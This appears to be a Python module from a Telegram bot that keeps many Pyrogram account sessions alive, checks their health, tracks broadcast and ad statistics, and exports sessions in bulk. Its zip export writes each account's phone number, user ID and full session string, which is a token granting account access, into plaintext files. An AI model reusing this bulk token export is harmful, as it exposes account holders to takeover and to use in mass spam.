import asyncio
import io
import json
import threading
import zipfile
from datetime import datetime, timedelta

from pyrogram import Client

import Nexa.database as dbmod
from config import API_ID, API_HASH
from Nexa.session_tools import check_session

CONNECT_TIMEOUT = 15
STOP_TIMEOUT = 3
CLEAN_INTERVAL = 3
HEALTH_EVERY = 15
HEALTH_BATCH = 4
HEALTH_MAX_AGE_MIN = 10

_global_stats = {"active_sessions": 0, "dead_cleaned": 0, "pending_msgs": 0, "health_runs": 0}


def _now():
    return datetime.now()


class SessionThread:
    def __init__(self, session_id, phone):
        self.session_id = session_id
        self.phone = phone
        self.client = None
        self.loop = None
        self.thread = None
        self.connected = False
        self.closed = False
        self.connection_error = None
        self.status = "connecting"
        self.created_at = _now()
        self.last_activity = self.created_at
        self._connected_event = threading.Event()
        self.thread = threading.Thread(target=self._run_loop, name=f"sess-{session_id}", daemon=True)
        self.thread.start()

    async def _init_and_connect(self):
        self.client = Client(
            name=f"session_{self.session_id}",
            api_id=API_ID, api_hash=API_HASH,
            in_memory=True, no_updates=True)
        await self.client.connect()

    def _run_loop(self):
        try:
            self.loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self.loop)
            self.loop.run_until_complete(self._init_and_connect())
            self.connected = True
            self.status = "connected"
            self._connected_event.set()
            self.loop.run_forever()
        except Exception as exc:
            self.connection_error = f"{type(exc).__name__}: {exc}"
            self.connected = False
            self.status = "dead"
            self._connected_event.set()
        finally:
            self.connected = False
            self.closed = True
            try:
                if self.loop and not self.loop.is_closed():
                    self.loop.close()
            except Exception:
                pass

    def wait_for_connection(self, timeout=CONNECT_TIMEOUT):
        return self._connected_event.wait(timeout=timeout)

    def is_alive(self):
        return bool(
            self.connected
            and not self.closed
            and self.thread is not None
            and self.thread.is_alive()
            and self.loop is not None
            and not self.loop.is_closed()
        )

    def age_seconds(self):
        return max(0, int((_now() - self.created_at).total_seconds()))

    def idle_seconds(self):
        return max(0, int((_now() - self.last_activity).total_seconds()))

    def execute(self, coro_func, *args, timeout=90):
        if not self.is_alive():
            raise RuntimeError("Session not connected")

        async def wrapper():
            return await coro_func(*args)

        try:
            future = asyncio.run_coroutine_threadsafe(wrapper(), self.loop)
            result = future.result(timeout=timeout)
            self.last_activity = _now()
            return result
        except Exception:
            if self.loop is not None and self.loop.is_closed():
                self.connected = False
                self.status = "dead"
            raise

    def stop(self):
        self.status = "closed"
        try:
            if self.client and self.connected and self.loop and not self.loop.is_closed():
                try:
                    asyncio.run_coroutine_threadsafe(
                        self.client.disconnect(), self.loop).result(timeout=STOP_TIMEOUT)
                except Exception:
                    pass
            if self.loop and self.loop.is_running():
                self.loop.call_soon_threadsafe(self.loop.stop)
            if self.thread and self.thread.is_alive():
                self.thread.join(timeout=STOP_TIMEOUT)
        except Exception:
            pass
        self.connected = False
        self.closed = True

    def info(self):
        return {
            "id": self.session_id,
            "phone": self.phone,
            "status": self.status,
            "connected": self.is_alive(),
            "age_seconds": self.age_seconds(),
            "idle_seconds": self.idle_seconds(),
            "created_at": self.created_at.isoformat(timespec="seconds"),
            "error": self.connection_error,
        }


class SessionManager:
    def __init__(self):
        self._sessions = {}
        self._lock = threading.RLock()

    def create_session(self, session_id, phone):
        self.remove_session(session_id)
        session = SessionThread(session_id, phone)
        if not session.wait_for_connection(timeout=CONNECT_TIMEOUT):
            session.stop()
            raise RuntimeError("Session connection timeout")
        if not session.connected:
            err = session.connection_error or "Unknown error"
            session.stop()
            raise RuntimeError(f"Failed to connect: {err}")
        with self._lock:
            self._sessions[session_id] = session
        dbmod.ensure_db()
        if dbmod.temp_sessions_col is not None:
            try:
                dbmod.temp_sessions_col.update_one(
                    {"_id": session_id},
                    {"$set": {"phone": phone, "created_at": _now(),
                              "status": "connected"}}, upsert=True)
            except Exception:
                pass
        return session

    def get_session(self, session_id):
        with self._lock:
            session = self._sessions.get(session_id)
        if session and session.is_alive():
            return session
        if session:
            self._drop(session_id, mark="dead")
        return None

    def remove_session(self, session_id):
        self._drop(session_id, mark=None)

    def kill_by_phone(self, phone):
        if not phone:
            return 0
        with self._lock:
            ids = [sid for sid, s in self._sessions.items() if s.phone == phone]
        for sid in ids:
            self._drop(sid, mark="closed")
        return len(ids)

    def _drop(self, session_id, mark=None):
        with self._lock:
            session = self._sessions.pop(session_id, None)
        if session:
            session.stop()
        dbmod.ensure_db()
        if dbmod.temp_sessions_col is not None:
            try:
                if mark:
                    dbmod.temp_sessions_col.update_one(
                        {"_id": session_id}, {"$set": {"status": mark}})
                dbmod.temp_sessions_col.delete_one({"_id": session_id})
            except Exception:
                pass

    def touch(self, session_id):
        with self._lock:
            session = self._sessions.get(session_id)
        if session:
            session.last_activity = _now()

    def list_sessions(self):
        with self._lock:
            sessions = list(self._sessions.values())
        return [s.info() for s in sessions]

    def export_session_string(self, session_id):
        session = self.get_session(session_id)
        if not session:
            return None
        try:
            return session.execute(lambda: session.client.export_session_string())
        except Exception:
            return None

    def get_active_count(self):
        with self._lock:
            sessions = list(self._sessions.values())
        return sum(1 for s in sessions if s.is_alive())

    def stats(self):
        return {
            "active_sessions": self.get_active_count(),
            "tracked_sessions": len(self._sessions),
            "dead_cleaned": _global_stats["dead_cleaned"],
        }

    def cleanup_old(self, max_age_minutes=25):
        dbmod.ensure_db()
        if dbmod.temp_sessions_col is None:
            return 0
        cutoff = _now() - timedelta(minutes=max_age_minutes)
        removed = 0
        try:
            for doc in list(dbmod.temp_sessions_col.find({"created_at": {"$lt": cutoff}})):
                self._drop(doc["_id"], mark="expired")
                removed += 1
        except Exception:
            pass
        return removed

    def cleanup_dead_sessions(self):
        with self._lock:
            dead = [sid for sid, s in self._sessions.items() if not s.is_alive()]
        for sid in dead:
            self._drop(sid, mark="dead")
        if dead:
            _global_stats["dead_cleaned"] += len(dead)
        return len(dead)

    def enforce_auto_logout(self, hours=None):
        if hours is None:
            enabled, hours = dbmod.get_auto_logout()
            if not enabled:
                return 0
        cutoff = _now() - timedelta(hours=max(1, int(hours)))
        with self._lock:
            stale = [sid for sid, s in self._sessions.items() if s.created_at < cutoff]
        for sid in stale:
            self._drop(sid, mark="expired")
        return len(stale)

    def health_check(self, limit=HEALTH_BATCH, max_age_min=HEALTH_MAX_AGE_MIN):
        rows = dbmod.get_sessions_due_for_check(limit=limit, max_age_min=max_age_min)
        dead = 0
        for row in rows:
            phone = row.get("phone")
            ok, err = check_session(row.get("session_string"), attempts=1, delay=0)
            dbmod.record_check(phone, ok, err)
            if not ok:
                dead += 1
                self.kill_by_phone(phone)
        return len(rows), dead

    def prune_dead(self):
        rows = dbmod.get_active_sessions_for_export(limit=200)
        dead = 0
        for row in rows:
            ok, err = check_session(row.get("session_string"), attempts=1, delay=0)
            if not ok:
                dbmod.record_check(row.get("phone"), False, err)
                self.kill_by_phone(row.get("phone"))
                dead += 1
        return dead

    def stop_all(self):
        with self._lock:
            ids = list(self._sessions)
        for sid in ids:
            self._drop(sid)
        return len(ids)


class SessionCleaner:
    def __init__(self):
        self._running = False
        self._thread = None
        self._stop_event = threading.Event()
        self._ticks = 0

    def is_running(self):
        return self._running

    def start(self):
        if self._running:
            return False
        self._running = True
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._run, name="session-cleaner", daemon=True)
        self._thread.start()
        print("Session Cleaner started", flush=True)
        return True

    def stop(self):
        if not self._running:
            return False
        self._stop_event.set()
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        print("Session Cleaner stopped", flush=True)
        return True

    def _run(self):
        while not self._stop_event.is_set():
            try:
                dead = session_manager.cleanup_dead_sessions()
                if dead:
                    print(f"Cleaned {dead} dead session(s)", flush=True)

                enabled, hours = dbmod.get_auto_logout()
                if enabled:
                    expired = session_manager.enforce_auto_logout(hours)
                    if expired:
                        print(f"Auto-logged-out {expired} session(s)", flush=True)

                self._ticks += 1
                if self._ticks % HEALTH_EVERY == 0:
                    checked, found = session_manager.health_check()
                    if checked:
                        _global_stats["health_runs"] += 1
                        print(f"Health check: {checked} checked, {found} dead", flush=True)

                _global_stats["active_sessions"] = session_manager.get_active_count()
                dbmod.ensure_db()
                if dbmod.broadcast_msgs_col is not None:
                    try:
                        _global_stats["pending_msgs"] = dbmod.broadcast_msgs_col.count_documents({})
                    except Exception:
                        pass
                if dbmod.ads_config_col is not None:
                    try:
                        dbmod.ads_config_col.update_one(
                            {"_id": "stats"},
                            {"$set": {
                                "active_sessions": _global_stats["active_sessions"],
                                "pending_msgs": _global_stats["pending_msgs"],
                                "dead_cleaned": _global_stats["dead_cleaned"],
                                "last_cleanup": _now()}},
                            upsert=True)
                    except Exception:
                        pass
            except Exception as exc:
                print(f"Session cleaner error: {type(exc).__name__}: {exc}", flush=True)
            self._stop_event.wait(CLEAN_INTERVAL)


def build_sessions_zip(pending, users):
    buf = io.BytesIO()
    stamp = _now().strftime("%Y%m%d_%H%M%S")
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("manifest.json", json.dumps({
            "generated_at": _now().isoformat(timespec="seconds"),
            "pending_sessions": len(pending),
            "verified_sessions": len(users),
        }, indent=2))
        for item in pending:
            name = (item.get("phone") or item.get("id") or "session").lstrip("+")
            zf.writestr(f"pending/{name}.json", json.dumps(item, indent=2))
        for item in users:
            phone = (item.get("phone") or "unknown").lstrip("+")
            body = (
                f"phone: {item.get('phone')}\n"
                f"user_id: {item.get('user_id')}\n"
                f"username: {item.get('username')}\n"
                f"status: {item.get('status')}\n"
                f"created_at: {item.get('created_at')}\n\n"
                f"session_string:\n{item.get('session_string')}\n"
            )
            zf.writestr(f"sessions/{phone}.txt", body)
    buf.seek(0)
    return buf, f"sessions_{stamp}.zip"


session_manager = SessionManager()
session_cleaner = SessionCleaner()